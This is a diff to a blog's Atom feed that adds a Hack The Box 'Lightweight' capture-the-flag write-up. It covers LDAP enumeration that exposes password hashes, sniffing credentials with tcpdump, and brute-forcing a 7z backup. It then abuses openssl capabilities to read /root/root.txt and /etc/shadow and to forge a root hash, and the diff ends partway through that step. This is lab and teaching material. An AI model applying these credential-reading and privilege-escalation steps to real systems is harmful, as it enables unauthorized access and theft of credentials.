@@ -1,4 +1,339 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-05-04T16:17:33+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - BigHead</title><link href="http://localhost:4000/hack-the-box/bighead/" rel="alternate" type="text/html" title="Hack The Box - BigHead" /><published>2019-05-04T00:00:00+02:00</published><updated>2019-05-04T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/bighead</id><content type="html" xml:base="http://localhost:4000/hack-the-box/bighead/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-05-11T16:11:26+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Lightweight</title><link href="http://localhost:4000/hack-the-box/lightweight/" rel="alternate" type="text/html" title="Hack The Box - Lightweight" /><published>2019-05-11T00:00:00+02:00</published><updated>2019-05-11T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lightweight</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lightweight/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-lightweight-retired-and-heres-my-write-up-about-it-lightweight-was-a-simple-and-a-straightforward-machine-i-had-fun-solving-it-and-i-liked-it-the-idea-behind-the-box-is-simple-we-get-initial-ssh-access-then-keep-escalating-privileges-until-we-reach-root-its-a-linux-machine-and-its-ip-is-101010119-i-added-it-to-etchosts-as-lightweighthtb-lets-jump-right-in&quot;&gt;Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.119&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lightweight.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC lightweight.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;3-ports-are-open--22-running-ssh-80-running-http-and-389-running-ldap-lets-check-ldap-first&quot;&gt;3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ldap-enumeration&quot;&gt;Ldap Enumeration&lt;/h3&gt;
+&lt;h4 id=&quot;to-enumerate-ldap-i-like-to-use-a-tool-called-ldapsearch-theres-also-an-nmap-script-called-ldap-search-that-can-do-the-same-thing&quot;&gt;To enumerate ldap I like to use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;, There’s also an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; that can do the same thing.&lt;/h4&gt;
+&lt;h4 id=&quot;ldapsearch-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot;&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# lightweight.htb
+dn: dc=lightweight,dc=htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: lightweight htb
+dc: lightweight
+
+# Manager, lightweight.htb
+dn: cn=Manager,dc=lightweight,dc=htb
+objectClass: organizationalRole
+cn: Manager
+description: Directory Manager
+
+# People, lightweight.htb
+dn: ou=People,dc=lightweight,dc=htb
+objectClass: organizationalUnit
+ou: People
+
+# Group, lightweight.htb
+dn: ou=Group,dc=lightweight,dc=htb
+objectClass: organizationalUnit
+ou: Group
+
+# ldapuser1, People, lightweight.htb
+dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
+uid: ldapuser1
+cn: ldapuser1
+sn: ldapuser1
+mail: ldapuser1@lightweight.htb
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: top
+objectClass: shadowAccount
+userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
+ oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
+shadowLastChange: 17691
+shadowMin: 0
+shadowMax: 99999
+shadowWarning: 7
+loginShell: /bin/bash
+uidNumber: 1000
+gidNumber: 1000
+homeDirectory: /home/ldapuser1
+
+# ldapuser2, People, lightweight.htb
+dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+uid: ldapuser2
+cn: ldapuser2
+sn: ldapuser2
+mail: ldapuser2@lightweight.htb
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: top
+objectClass: shadowAccount
+userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
+ zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
+shadowLastChange: 17691
+shadowMin: 0
+shadowMax: 99999
+shadowWarning: 7
+loginShell: /bin/bash
+uidNumber: 1001
+gidNumber: 1001
+homeDirectory: /home/ldapuser2
+
+# ldapuser1, Group, lightweight.htb
+dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: ldapuser1
+userPassword:: e2NyeXB0fXg=
+gidNumber: 1000
+
+# ldapuser2, Group, lightweight.htb
+dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: ldapuser2
+userPassword:: e2NyeXB0fXg=
+gidNumber: 1001
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 9
+# numEntries: 8
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;nmap-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script=ldap-search lightweight.htb&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script=ldap-search -o ldap.nmap lightweight.htb
+Nmap scan report for lightweight.htb (10.10.10.119)
+Host is up (0.17s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=lightweight,dc=htb
+|     dn: dc=lightweight,dc=htb
+|         objectClass: top
+|         objectClass: dcObject
+|         objectClass: organization
+|         o: lightweight htb
+|         dc: lightweight
+|     dn: cn=Manager,dc=lightweight,dc=htb
+|         objectClass: organizationalRole
+|         cn: Manager
+|         description: Directory Manager
+|     dn: ou=People,dc=lightweight,dc=htb
+|         objectClass: organizationalUnit
+|         ou: People
+|     dn: ou=Group,dc=lightweight,dc=htb
+|         objectClass: organizationalUnit
+|         ou: Group
+|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
+|         uid: ldapuser1
+|         cn: ldapuser1
+|         sn: ldapuser1
+|         mail: ldapuser1@lightweight.htb
+|         objectClass: person
+|         objectClass: organizationalPerson
+|         objectClass: inetOrgPerson
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: shadowAccount
+|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
+|         shadowLastChange: 17691
+|         shadowMin: 0
+|         shadowMax: 99999
+|         shadowWarning: 7
+|         loginShell: /bin/bash
+|         uidNumber: 1000
+|         gidNumber: 1000
+|         homeDirectory: /home/ldapuser1
+|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+|         uid: ldapuser2
+|         cn: ldapuser2
+|         sn: ldapuser2
+|         mail: ldapuser2@lightweight.htb
+|         objectClass: person
+|         objectClass: organizationalPerson
+|         objectClass: inetOrgPerson
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: shadowAccount
+|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
+|         shadowLastChange: 17691
+|         shadowMin: 0
+|         shadowMax: 99999
+|         shadowWarning: 7
+|         loginShell: /bin/bash
+|         uidNumber: 1001
+|         gidNumber: 1001
+|         homeDirectory: /home/ldapuser2
+|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: ldapuser1
+|         userPassword: {crypt}x
+|         gidNumber: 1000
+|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: ldapuser2
+|         userPassword: {crypt}x
+|_        gidNumber: 1001
+
+# Nmap done at Fri May 10 17:11:03 2019 -- 1 IP address (1 host up) scanned in 17.35 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;if-we-take-a-look-at-ldapsearch-results-&quot;&gt;If we take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; results :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-some-info-for-2-users--ldapuser1-and-ldapuser2-userpassword-is-a-base64-encoded-string-i-decoded-it-and-got-the-same-hashes-i-got-from-ldap-search-nmap-script-&quot;&gt;We have some info for 2 users : &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;userPassword&lt;/code&gt; is a base64 encoded string. I decoded it and got the same hashes I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;however-i-tried-to-crack-the-hashes-and-they-didnt-crack-lets-check-http&quot;&gt;However, I tried to crack the hashes and they didn’t crack. Let’s check http.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
+&lt;h4 id=&quot;usually-i-use-some-tools-for-web-like-gobuster-for-example-but-this-time-we-cant-do-that-because-we-will-get-blocked-as-you-can-see-&quot;&gt;Usually I use some tools for web like &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; for example, But this time We can’t do that because we will get blocked as you can see :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;also-the-info-page-is-saying-the-same-thing-&quot;&gt;Also the &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt; page is saying the same thing :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-its-also-saying-if-you-like-to-get-in-the-box-please-go-to-the-user-page-lets-check-user-&quot;&gt;And it’s also saying &lt;code class=&quot;highlighter-rouge&quot;&gt;If you like to get in the box, please go to the user page&lt;/code&gt;. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-we-can-login-with-ssh-with-the-ip-as-the-username-and-the-password-lets-try-&quot;&gt;So we can login with ssh with the ip as the username and the password. Let’s try :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;its-working-&quot;&gt;It’s working !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;tcpdump-capabilities-user-flag&quot;&gt;Tcpdump Capabilities, User Flag&lt;/h3&gt;
+&lt;h4 id=&quot;one-of-the-things-i-always-check-when-enumerating-linux-filesystem-is-the-binary-capabilities-so-i-used-getcap-on-some-directories-like-bin-usrbin-and-usrsbin-i-noticed-that-tcpdump-has-cap_net_admincap_net_rawep-capabilities&quot;&gt;One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt; on some directories like &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt;. I noticed that &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; has &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_net_admin,cap_net_raw+ep&lt;/code&gt; capabilities.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;from-the-linux-capabilities-manual-i-found-some-info-about-these-capabilities-&quot;&gt;From the &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;Linux Capabilities Manual&lt;/a&gt; I found some info about these capabilities :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**CAP_NET_ADMIN**
+              Perform various network-related operations:
+              * interface configuration;
+              * administration of IP firewall, masquerading, and accounting;
+              * modify routing tables;
+              * bind to any address for transparent proxying;
+              * set type-of-service (TOS)
+              * clear driver statistics;
+              * set promiscuous mode;
+              * enabling multicasting;
+              * use [setsockopt(2)](http://man7.org/linux/man-pages/man2/setsockopt.2.html) to set the following socket options:
+                **SO_DEBUG**, **SO_MARK**, **SO_PRIORITY** (for a priority outside the
+                range 0 to 6), **SO_RCVBUFFORCE**, and **SO_SNDBUFFORCE**.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; **CAP_NET_RAW**
+              * Use RAW and PACKET sockets;
+              * bind to any address for transparent proxying.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;great-i-ran-tcpdump-on-all-the-interfaces-and-saved-the-output-to-capturedpcap-and-i-left-it-for-some-time-&quot;&gt;Great. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; on all the interfaces and saved the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;captured.pcap&lt;/code&gt; and I left it for some time :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump -i any -w captured.pcap&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-downloaded-the-pcap-on-my-box-to-open-it-with-wireshark-&quot;&gt;I downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;pcap&lt;/code&gt; on my box to open it with &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;in-wireshark-i-noticed-an-ldap-request-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; I noticed an &lt;code class=&quot;highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-looked-at-it-and-found-that-its-an-authentication-request-&quot;&gt;I looked at it and found that it’s an authentication request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-we-have-the-password-for-ldapuser2--8bc8251332abe1d7f105d3e53ad39ac2-lets-su-&quot;&gt;Now we have the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; :	&lt;code class=&quot;highlighter-rouge&quot;&gt;8bc8251332abe1d7f105d3e53ad39ac2&lt;/code&gt;. Lets &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/14.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;bruteforcing-7z-hardcoded-credentials-privilege-escalation-to-ldapuser1&quot;&gt;Bruteforcing &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt;, Hardcoded Credentials, Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt;&lt;/h3&gt;
+&lt;h4 id=&quot;in-the-home-directory-of-ldapuser2-there-was-a-backup-file-called-backup7z-i-tried-to-extract-it-but-it-was-password-protected-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; there was a backup file called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.7z&lt;/code&gt;. I tried to extract it but it was password protected :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-i-transferred-it-to-my-box-to-bruteforce-it-nc-wasnt-installed-and-i-couldnt-use-scp-so-i-transferred-it-with-base64-encodingdecoding-&quot;&gt;So I transferred it to my box to bruteforce it (&lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; wasn’t installed and I couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt; so I transferred it with base64 encoding/decoding) :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/17.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/18.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-used-this-tool-to-bruteforce-the-7z-file-&quot;&gt;I used &lt;a href=&quot;https://github.com/Seyptoo/7z-BruteForce&quot;&gt;this tool&lt;/a&gt; to bruteforce the &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; file :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python 7z.py backup.7z /usr/share/wordlists/rockyou.txt&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-password-is-delete-after-extraction-we-have-some-php-files-looks-like-the-source-of-the-web-site-hosted-on-port-80-&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;delete&lt;/code&gt;. After extraction we have some &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files, Looks like the source of the web site hosted on port 80 :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-checked-them-all-and-in-statusphp-i-found-hardcoded-credentials-for-ldapuser1-&quot;&gt;I checked them all and in &lt;code class=&quot;highlighter-rouge&quot;&gt;status.php&lt;/code&gt; I found hardcoded credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-we-can-su-to-ldapuser1-with-the-password--f3ca9d298a553da117442deeb6fa932d-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; with the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;f3ca9d298a553da117442deeb6fa932d&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;openssl-capabilities-root-flag&quot;&gt;Openssl Capabilities, Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;i-looked-at-the-contents-of-homeldapuser1-and-i-noticed-some-stuff-a-php-file-called-ldaptlsphp-and-two-binaries--openssl-and-tcpdump&quot;&gt;I looked at the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ldapuser1&lt;/code&gt; and I noticed some stuff. A &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapTLS.php&lt;/code&gt; and two binaries : &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/24.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;cat ldapTLS.php&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;nothing-interesting-lets-check-the-binaries-we-dont-need-tcpdump-anymore-so-we-will-focus-on-openssl&quot;&gt;Nothing interesting. Lets check the binaries. (We don’t need &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; anymore so we will focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt;)&lt;/h4&gt;
+&lt;h4 id=&quot;i-checked-the-capabilities-and-i-found-that-openssl-has-the-ep-capability-which-means-it-can-read-and-write-anything-on-the-filesystem&quot;&gt;I checked the capabilities and I found that &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; has the &lt;code class=&quot;highlighter-rouge&quot;&gt;ep&lt;/code&gt; capability which means it can read and write anything on the filesystem.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;this--means-that-we-can-simply-read-the-root-flag-by-using-the-base64-encoding-function-in-openssl-then-decoding-the-file-&quot;&gt;This  means that we can simply read the root flag by using the base64 encoding function in &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; then decoding the file :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d root.txt.b64&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-can-also-get-a-root-shell-by-overwriting-etcpasswd-or-etcshadow-i-got-a-copy-of-the-original-shadow-file-first-&quot;&gt;We can also get a root shell by overwriting &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt;. I got a copy of the original &lt;code class=&quot;highlighter-rouge&quot;&gt;shadow&lt;/code&gt; file first :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /etc/shadow -out ./shadow.b64&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d shadow.b64 &amp;gt; shadow&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-used-openssl-to-create-a-salted-password-i-used-root-as-the-salt-and-rick-as-the-password-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to create a salted password. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; as the salt and &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; as the password :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl passwd -1 -salt root rick&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-edited-the-copy-i-have-of-etcshadow-and-replaced-the-root-password-with-the-new-one-&quot;&gt;Then I edited the copy I have of &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; and replaced the root password with the new one :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
